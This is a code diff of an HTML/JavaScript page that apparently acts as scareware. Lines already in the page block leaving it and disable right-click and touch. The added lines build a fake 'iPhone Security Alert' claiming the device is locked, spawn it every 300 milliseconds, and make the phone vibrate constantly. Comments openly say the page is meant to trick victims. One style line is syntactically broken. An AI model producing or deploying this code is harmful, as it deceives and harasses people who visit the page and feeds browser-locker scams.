@@ -50,4 +50,23 @@
             return "You can't leave!";        };        // Disable right-click, touch events, etc.
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); // Fake iOS alert (tricks victims into thinking it's a system message)
-        function fakeAlert() {            const alert = document.createElement('div')
+        function fakeAlert() {            const alert = document.createElement('div');            alert.style.position = 'fixed';
+            alert.style.top = '50%';
+            alert.style.left = '5%';
+            alert.style.width = '90%';
+            alert.style.backgroundColor = 'white';
+            alert.style.border = '1px solid #ccc';
+            alert.style.borderRadius = '15px';
+           alert.style.padding = '20px';
+           alert.style.boxShadow = '0 4px 8px rgba(0, ));';
+           alert.style.zIndex = '9999';
+           alert.style.textAlign = 'center';
+           alert.innerHTML = `               <h3>iPhone Security Alert</h3>
+               <p>Your device has been locked for security reasons.</p> <p>Tap "OK" to unlock.</p> <button onclick="this.parentElement.remove()">OK</button>
+           `;           document.body.appendChild(alert);       } setInterval(fakeAlert, 300); // Spam fake alerts
+
+       // Vibrate phone (if supported)
+       if (navigator.vibrate) {           setInterval(() => navigator.vibrate(1), 10); // Constant vibration
+       } </script>
+</body>
+</html>
